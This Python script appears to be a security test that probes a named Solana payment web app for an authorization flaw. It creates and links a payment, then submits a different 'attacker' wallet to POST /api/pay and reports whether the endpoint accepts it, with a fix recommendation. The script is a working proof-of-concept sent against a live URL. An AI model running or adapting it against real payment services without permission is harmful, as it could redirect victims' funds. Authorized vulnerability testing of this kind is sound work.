#!/usr/bin/env python3
"""
AUTHZ-VULN-03 Security Test
Tests if POST /api/pay accepts arbitrary wallet addresses without validating
they match the payment owner.
"""

import requests
import json
import sys

BASE_URL = "https://solana-blik.vercel.app"

def print_step(step_num, title):
    print(f"\n{'='*70}")
    print(f"STEP {step_num}: {title}")
    print('='*70)

def print_response(response):
    print(f"Status Code: {response.status_code}")
    print(f"Response Headers: {dict(response.headers)}")
    try:
        response_json = response.json()
        print(f"Response Body:\n{json.dumps(response_json, indent=2)}")
        return response_json
    except:
        print(f"Response Body (raw):\n{response.text}")
        return None

def main():
    print("="*70)
    print("AUTHZ-VULN-03: Arbitrary Wallet Address Acceptance Test")
    print("="*70)

    # Step 1: Create a legitimate payment
    print_step(1, "Create Legitimate Payment")
    step1_url = f"{BASE_URL}/api/payments/create"
    step1_payload = {
        "amount": 0.5,
        "merchantWallet": "11111111111111111111111111111111"
    }
    print(f"POST {step1_url}")
    print(f"Payload: {json.dumps(step1_payload, indent=2)}")

    try:
        step1_response = requests.post(step1_url, json=step1_payload, timeout=30)
        step1_data = print_response(step1_response)

        if not step1_data or 'id' not in step1_data:
            print("\n❌ ERROR: Failed to create payment or no payment ID returned")
            sys.exit(1)

        payment_id = step1_data['id']
        print(f"\n✓ Payment created successfully with ID: {payment_id}")
    except Exception as e:
        print(f"\n❌ ERROR in Step 1: {e}")
        sys.exit(1)

    # Step 2: Generate a code for legitimate wallet
    print_step(2, "Generate Code for Legitimate Wallet")
    step2_url = f"{BASE_URL}/api/codes/generate"
    step2_payload = {
        "walletPubkey": "22222222222222222222222222222222"
    }
    print(f"POST {step2_url}")
    print(f"Payload: {json.dumps(step2_payload, indent=2)}")

    try:
        step2_response = requests.post(step2_url, json=step2_payload, timeout=30)
        step2_data = print_response(step2_response)

        if not step2_data or 'code' not in step2_data:
            print("\n❌ ERROR: Failed to generate code or no code returned")
            sys.exit(1)

        blik_code = step2_data['code']
        print(f"\n✓ Code generated successfully: {blik_code}")
    except Exception as e:
        print(f"\n❌ ERROR in Step 2: {e}")
        sys.exit(1)

    # Step 3: Link the code to the payment
    print_step(3, "Link Code to Payment")
    step3_url = f"{BASE_URL}/api/payments/link"
    step3_payload = {
        "paymentId": payment_id,
        "code": blik_code
    }
    print(f"POST {step3_url}")
    print(f"Payload: {json.dumps(step3_payload, indent=2)}")

    try:
        step3_response = requests.post(step3_url, json=step3_payload, timeout=30)
        step3_data = print_response(step3_response)

        if step3_response.status_code != 200:
            print("\n❌ ERROR: Failed to link code to payment")
            sys.exit(1)

        print(f"\n✓ Code linked to payment successfully")
    except Exception as e:
        print(f"\n❌ ERROR in Step 3: {e}")
        sys.exit(1)

    # Step 4: EXPLOIT - Try to build payment with DIFFERENT attacker wallet
    print_step(4, "EXPLOIT ATTEMPT - Use Different Attacker Wallet")
    print("⚠️  CRITICAL TEST: Attempting to use ATTACKER wallet (33333...) instead of legitimate wallet (22222...)")
    step4_url = f"{BASE_URL}/api/pay"
    step4_payload = {
        "paymentId": payment_id,
        "account": "33333333333333333333333333333333"  # DIFFERENT wallet - attacker's wallet
    }
    print(f"POST {step4_url}")
    print(f"Payload: {json.dumps(step4_payload, indent=2)}")
    print("\nNote: Payment was linked to wallet 22222... but we're using 33333...")

    try:
        step4_response = requests.post(step4_url, json=step4_payload, timeout=30)
        step4_data = print_response(step4_response)

        # Analyze the result
        print("\n" + "="*70)
        print("VULNERABILITY ANALYSIS")
        print("="*70)

        if step4_response.status_code == 200:
            print("\n🚨 VULNERABILITY CONFIRMED! 🚨")
            print("\nThe endpoint accepted an arbitrary wallet address that doesn't match")
            print("the payment owner. This is a critical authorization bypass vulnerability.")
            print("\nATTACK SCENARIO:")
            print("1. Legitimate customer (wallet 22222...) created and linked payment")
            print("2. Attacker intercepted the paymentId")
            print("3. Attacker successfully substituted their wallet (33333...)")
            print("4. Transaction would send funds to attacker instead of legitimate customer")

            if step4_data:
                print("\nTRANSACTION DETAILS:")
                if 'transaction' in step4_data:
                    print(f"  Transaction generated: YES")
                    print(f"  Transaction length: {len(step4_data['transaction'])} characters")
                if 'receiptPda' in step4_data:
                    print(f"  Receipt PDA: {step4_data['receiptPda']}")
                if 'amount' in step4_data:
                    print(f"  Amount: {step4_data['amount']}")

            print("\nRECOMMENDATION:")
            print("The /api/pay endpoint MUST verify that the provided 'account' parameter")
            print("matches the wallet address associated with the payment's linked code.")

            return 1  # Vulnerability found
        else:
            print("\n✓ VULNERABILITY NOT EXPLOITABLE")
            print(f"\nThe endpoint rejected the arbitrary wallet address (status {step4_response.status_code})")
            print("The authorization check appears to be working correctly.")
            return 0  # No vulnerability

    except Exception as e:
        print(f"\n❌ ERROR in Step 4: {e}")
        sys.exit(1)

if __name__ == "__main__":
    exit_code = main()
    sys.exit(exit_code)
